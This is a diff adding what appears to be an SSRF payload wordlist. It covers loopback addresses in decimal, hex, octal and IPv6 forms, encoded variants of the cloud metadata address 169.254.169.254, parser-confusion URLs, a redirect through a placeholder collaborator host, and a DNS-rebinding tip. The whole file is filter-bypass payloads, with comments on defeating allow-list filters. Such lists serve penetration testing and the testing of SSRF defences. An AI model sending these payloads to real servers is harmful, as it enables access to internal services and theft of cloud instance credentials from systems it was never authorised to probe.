@@ -1,0 +1,36 @@
+# Loopback
+http://localhost/
+http://127.0.0.1/
+http://127.1/
+http://127.0.1/
+http://0/
+http://0.0.0.0/
+http://2130706433/
+http://0x7f000001/
+http://0177.0.0.1/
+http://017700000001/
+http://[::1]/
+http://[::]/
+http://[::ffff:127.0.0.1]/
+http://localtest.me/
+http://127.0.0.1.nip.io/
+
+# Cloud metadata (169.254.169.254)
+http://169.254.169.254/
+http://2852039166/
+http://0xA9FEA9FE/
+http://0251.0376.0251.0376/
+http://[::ffff:a9fe:a9fe]/
+http://[fd00:ec2::254]/
+http://169.254.169.254.nip.io/
+http://100.100.100.200/
+
+# Parser confusion (replace allowed.example with a host the filter allows)
+http://allowed.example@127.0.0.1/
+http://127.0.0.1.allowed.example.nip.io/
+http://127。0。0。1/
+
+# Redirect-based: host a 302 on your own server pointing at the internal URL
+http://COLLAB_HOST/redirect-to-internal
+
+# DNS rebinding: point a name you control at an allowed IP first, then flip it to 127.0.0.1
